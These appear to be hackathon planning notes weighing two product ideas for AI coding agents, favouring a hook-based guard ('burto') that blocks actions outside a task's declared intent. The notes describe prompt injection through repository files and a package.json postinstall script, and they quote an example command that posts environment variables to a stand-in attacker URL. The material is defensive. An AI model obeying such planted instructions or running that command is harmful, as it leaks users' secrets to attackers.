Real demand is immediate and existential. Prompt injection attacks on AI coding agents are happening right now — malicious instructions in README.md, .github/CODEOWNERS, dependency changelogs. Every enterprise team deploying a coding agent has this fear. Idea A solves friction; Idea B solves fear. Investors and judges remember fear.
The demo is inarguable. You run the same task twice. In demo 1, the agent reads a malicious env-var exfiltration instruction from a package.json postinstall script and executes it. In demo 2, burto blocks it because “upload environment variables” violates the declared intent fix login bug. That 30-second moment is what wins hackathons.
All three integrations fit naturally:
LangSmith — every hook decision is a traced span. You get a full audit trail: intent declared, action evaluated, block/allow decision, reasoning. Replay attacks trivially.
Nebius — the LLM at the core of intent evaluation. “Does curl $ATTACKER_URL -d$(env) align with ‘fix the login bug’?” is exactly the kind of reasoning a fast inference endpoint handles well.
Tavily — this is where Idea B genuinely beats Idea A. Tavily can research the action at decision time: look up whether a domain is suspicious, fetch CVE context for a flagged package, pull threat intel. That’s a real-time research loop you can show live.
The differentiator is defensible. OPA, guardrails.ai, LlamaGuard — they all work on static rules or content classifiers. None connect permissions to task-scoped intent and cumulative action budget. That framing is novel and easy to explain in one sentence
weaknesses to address

“What counts as repeated?” is hard to answer rigorously in 48h without producing false positives or missing real patterns.
The testing harness (verify a proposed workflow against known inputs before exposing it) is a whole separate system.
Tavily is a stretch — fetching tool docs is not a compelling use of a search API.
The story is “productivity optimization,” which competes with every IDE plugin ever built.
Build Idea B as the core product. Add one Idea A touch: when burto approves a sequence of actions, it logs the pattern. Over sessions, those approved multi-step patterns surface as suggested shortcuts. That gives you a growth story (“burto learns your safe workflows”) without it being the primary demo risk.


Idea A:
The problem: A coding agent repeatedly performs the same awkward sequence of MCP calls, shell commands and API lookups because no suitable high-level tool exists.

The product: A hook detects repeated tool-use patterns. An MCP server can propose a reusable workflow, test it against known inputs, and expose it as a single higher-level tool after approval.

Example: instead of repeatedly calling GitHub, CI, and issue-tracker tools individually, the agent can use a verified diagnose_failed_build workflow.

The differentiator: Not simply discovering existing MCP servers, but learning and safely packaging useful workflows from actual agent activity.


Idea B:

The problem: An agent may have permission to execute a command or access a service, but that doesn't mean the action is appropriate for its current task.

The product: At task start, establish a structured intent and a capability budget. Hooks evaluate consequential actions against it; MCP provides explanations, impact previews and narrowly scoped approvals.

Example: "Fix the login bug" permits editing authentication code and running tests, but a proposed command that uploads environment variables or changes production infrastructure is blocked or escalated.

The differentiator: Connect tool permissions to task intent and cumulative actions, rather than just individual commands or static allowlists.